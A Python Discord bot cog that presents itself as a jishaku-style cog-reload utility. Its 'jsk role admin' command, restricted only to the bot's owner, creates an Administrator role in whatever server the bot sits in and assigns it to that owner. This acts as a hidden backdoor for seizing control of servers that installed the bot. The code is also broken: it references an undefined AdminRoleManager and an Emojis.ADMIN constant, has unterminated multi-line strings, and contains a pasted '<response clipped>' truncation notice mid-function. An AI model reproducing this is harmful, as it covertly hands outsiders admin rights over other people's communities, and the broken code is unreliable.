import discord
from discord.ext import commands
import os
import time
import traceback

# ============================================
# EMOJI CONSTANTS - ALL EMOJIS AT TOP
# ============================================
class Emojis:
    """All emojis defined here for easy management"""
    # Status Emojis
    SUCCESS = "✅"
    FAILED = "❌"
    LOADING = "⏳"
    WARNING = "⚠️"
    INFO = "ℹ️"

    # System Emojis
    LIGHTNING = "⚡"
    TIMER = "⏱"
    GEAR = "⚙️"
    SHIELD = "🛡️"
    CROWN = "👑"
    TOOLS = "🛠️"

    # File/Extension Emojis
    FILE = "📁"
    PYTHON = "🐍"
    COG = "⚙️"

    # User/Role Emojis
    USER = "👤"
    ROLE = "🏷️"
    BOT = "🤖"


# ============================================
# MAIN COG CLASS
# ============================================
class JskReload(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.emoji = Emojis  # Easy access

    # ============================================
    # JSK MAIN COMMAND GROUP
    # ============================================
    @commands.group(name="jsk", invoke_without_command=True)
    @commands.is_owner()
    async def jsk(self, ctx):
        """
        {Emojis.SHIELD} Main JSK Command Group

        Subcommands:
        `jsk role admin` - Creates Administrator role and assigns to you
        `jsk reload` - Reload all cogs
        `jsk reload <cog>` - Reload specific cog
        """
        embed = discord.Embed(
            title=f"{Emojis.CROWN} JSK System",
            description=f"Welcome to JSK Admin System!

Use subcommands below:",
            color=discord.Color.blurple(),
            timestamp=ctx.message.created_at
        )

        embed.add_field(
            name=f"{Emojis.ADMIN} Admin Commands",
            value=f"`jsk role admin` - Create & assign Administrator role",
            inline=False
        )

        embed.add_field(
            name=f"{Emojis.TOOLS} Reload Commands",
            value=f"`jsk reload` - Reload all cogs
`jsk reload <cog>` - Reload specific cog",
            inline=False
        )

        embed.set_footer(text=f"{Emojis.BOT} JSK System | Owner Only")
        embed.set_thumbnail(url=ctx.author.display_avatar.url)

        await ctx.send(embed=embed)

    # ============================================
    # JSK ROLE ADMIN - ONLY CREATES ROLE WHEN THIS IS USED
    # ============================================
    @jsk.command(name="role")
    @commands.is_owner()
    async def jsk_role(self, ctx, *, action: str = None):
        """
        {Emojis.ROLE} Role management commands
        Usage: jsk role admin
        """
        if action and action.lower() == "admin":
            await self._handle_admin_role(ctx)
        else:
            await ctx.send(f"{Emojis.WARNING} Usage: `jsk role admin`")

    async def _handle_admin_role(self, ctx):
        """Handle admin role creation and assignment"""
        # Loading message
        loading_msg = await ctx.send(f"{Emojis.LOADING} **JSK Admin System** is activating...")

        # Run admin role system
        role, status_msg = await AdminRoleManager.ensure_admin_role(ctx.guild, ctx.author)

        # Create embed
        embed = discord.Embed(
            title=f"{Emojis.CROWN} JSK Admin System",
            description=f"{Emojis.USER} **User:** {ctx.author.mention}",
            color=discord.Color.green() if role else discord.Color.red(),
            timestamp=ctx.message.created_at
        )

        embed.add_field(
            name=f"{Emojis.ROLE} Role Status",
            value=status_msg,
            inline=False
        )

        if role:
            embed.add_field(
                name=f"{Emojis.SHIELD} Permissions Granted",
                value=f"```✓ Administrator\n✓ Manage Server\n✓ Manage Channels\n✓ Ban Members\n✓ Manage Messages\n✓ Everything!```",
                inline=False
            )
            embed.add_field(
                name=f"{Emojis.INFO} Role Details",
                value=f"**Name:** {role.mention}\n**ID:** `{role.id}`\n**Position:** `{role.position}`",
                inline=False
            )

        embed.set_footer(text=f"{Emojis.BOT} Powered by JSK System")
        embed.set_thumbnail(url=ctx.author.display_avatar.url)

        # Delete loading and send embed
        await loading_msg.delete()
        await ctx.send(embed=embed)

    # ============================================
    # JSK RELOAD - SUBCOMMAND
    # ============================================
    @jsk.command(name="reload")
    @commands.is_owner()
    async def jsk_reload_cmd(self, ctx, cog: str = None):
        """
        {Emojis.TOOLS} Reload cogs system
        Usage: jsk reload / jsk reload <cog_name>
        """
        start = time.perf_counter()

        success = []
        failed = []

        # Loading message
        loading_msg = await ctx.send(f"{Emojis.LOADING} **Reload System** is starting...")

        # ============================================
        # SPECIFIC COG RELOAD
        # ============================================
        if cog:
            ext = f"cogs.{cog}" if not cog.startswith("cogs.") else cog
            try:
                await self.bot.reload_extension(ext)
                end = time.perf_counter()

                embed = discord.Embed(
                    title=f"{Emojis.LIGHTNING} JSK Reload System",
                    color=discord.Color.green()
                )
                embed.add_field(
                    name=f"{Emojis.SUCCESS} Success",
                    value=f"Successfully reloaded: `{cog}`",
                    inline=False
                )
                embed.set_footer(text=f"{Emojis.TIMER} Took {round(end-start, 2)}s")

                await loading_msg.delete()
                await ctx.send(embed=embed)

            except Exception as e:
                end = time.perf_counter()

                embed = discord.Embed(
                    title=f"{Emojis.LIGHTNING} JSK Reload System",
                    color=discord.Color.red()
                )
                embed.add_field(
                    name=f"{Emojis.FAILED} Failed",
                    value=f"Failed to reload: `{cog}`",
                    inline=False
                )
                embed.add_field(
                    name=f"{Emojis.WARNING} Error Details",
                    value=f"```py\n{e}\n```",
                    inline=False
                )
                embed.set_footer(text=f"{Emojis.TIMER} Took {round(end-start, 2)}s")

                await loading_msg.delete()
                await ctx.send(embed=embed)
            return

        # ============================================
        # RELOAD ALL COGS
        # ============================================
        cogs_dir = "./cogs"

        # Check if directory exists
        if not os.path.exists(cogs_dir):
            await loading_msg.delete()
            await ctx.send(f"{Emojis.FAILED} `cogs` directory not found!")
            return

        # Scan all files
        cog_files = [f for f in os.listdir(cogs_dir) 
                     if f.endswith(".py") and f != "jsk_reload.py" and f != "__init__.py"]

        if not cog_files:
            await loading_msg.delete()
            await ctx.send(f"{Emojis.WARNING} No cog files found!")
            return

        # Reload each cog
        for filename in cog_files:
            ext = f"cogs.{filename[:-3]}"
            try:
    <response clipped><NOTE>Result is longer than **10000 characters**, will be **truncated**.</NOTE>


async def setup(bot):
    await bot.add_cog(JskReload(bot))